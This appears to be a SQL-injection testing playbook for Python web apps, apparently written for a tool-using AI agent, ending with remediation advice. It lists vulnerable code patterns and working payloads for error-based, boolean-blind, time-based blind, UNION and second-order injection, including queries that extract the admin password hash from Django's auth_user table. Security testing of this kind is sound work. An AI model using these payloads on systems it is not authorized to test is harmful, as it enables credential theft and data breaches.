# SQL injection (Python)

Python ORMs parameterize by default, so SQLi lives where developers drop to raw
SQL or string-format queries. Test every GET/POST param and form field.

Vulnerable patterns to assume behind an injectable input:
- Raw cursor with `%`-format / f-string: `cursor.execute("... WHERE id=%s" % id)`
  or `f"... '{name}'"` (NOT the safe `execute(sql, [params])` form).
- Django ORM escape hatches: `.raw("...%s..." % x)`, `.extra(where=[...])`,
  `Model.objects.filter(**request.GET)` built into raw SQL, `order_by` from input.
- SQLAlchemy `text("... " + x)` / `engine.execute(string)`.

1. **Find inputs**: `browser_get_form_fields`, plus params seen in `http_history`.
2. **Error-based**: inject `'` and submit (`browser_type` + `browser_click` +
   `browser_wait_for`, or `http_request`). Look for driver errors:
   `psycopg2.errors.SyntaxError`, `sqlite3.OperationalError`,
   `MySQLdb._exceptions`, `django.db.utils.ProgrammingError`,
   `unterminated quoted string`, `near "...": syntax error`. With DEBUG=True the
   full traceback shows the offending SQL — read it with `http_flow_body`.
3. **Boolean-blind**: compare `id=1 AND 1=1` vs `id=1 AND 1=2` (and quoted
   `id=1' AND '1'='1`). Differential `length`/status ⇒ blind SQLi. Sweep both
   payloads with one `http_fuzz` (marker on the `id` value) and read deltas.
3bis. **Time-based blind** (no visible boolean channel) — inject a delay and
   read `elapsedMs` (`http_request`, one isolated request) or `timeMs`
   (`http_fuzz`, one row per payload — the fuzz is already sequential):
   `' AND SLEEP(5)-- ` (MySQL/MariaDB), `'; SELECT pg_sleep(5)-- ` (Postgres).
   SQLite has no SLEEP: force CPU cost instead — `' AND (SELECT COUNT(*) FROM
   sqlite_master AS a, sqlite_master AS b, sqlite_master AS c)-- `. 5s+
   threshold to beat jitter; see `00-notes.md` — a Flask dev server serializes
   requests, don't navigate in parallel while measuring. Char-by-char
   extraction: `http_fuzz` with the marker on the compared char (`' AND
   SUBSTR((SELECT password FROM auth_user WHERE username='admin'),1,1)>'m'-- `),
   read `timeMs` row by row — no `match_regex` here, the response is identical.
4. **UNION extraction**: column count via `' ORDER BY n-- ` (or `n--` unquoted),
   then `1' UNION SELECT username,password FROM auth_user-- ` (Django's default
   user table is `auth_user`). `http_fuzz` over `ORDER BY FUZZ-- `, payloads
   `1..20`, finds the column count in one call.
5. Prefer `http_request from_flow` for single tampered requests; `http_fuzz` with
   `match_regex` on the driver-error strings above to flag injectable inputs.
6. **Second-order SQLi** (stored now, executed later) — inject into a STORAGE
   point (username/display name/profile field) via `browser_type`+`browser_click`
   or `http_request`, e.g. username `x' UNION SELECT password FROM auth_user
   WHERE username='admin'-- `. Then reach the TRIGGER point that re-reads that
   value into a raw query (profile page, admin list, export, password-change
   confirmation) — `browser_navigate`/`http_request` — and read the response.
   If the trigger reflects nothing, blind fallback: store a boolean/time payload
   (`x' AND SLEEP(5) AND '1'='1`), trigger it, read `elapsedMs`.

Evidence: the injected request + the DB error or dumped rows.
Remediation: always pass params, never format — `cursor.execute(sql, [args])`,
`Model.objects.raw(sql, [args])`; avoid `.extra()`; validate `order_by` against a
whitelist.
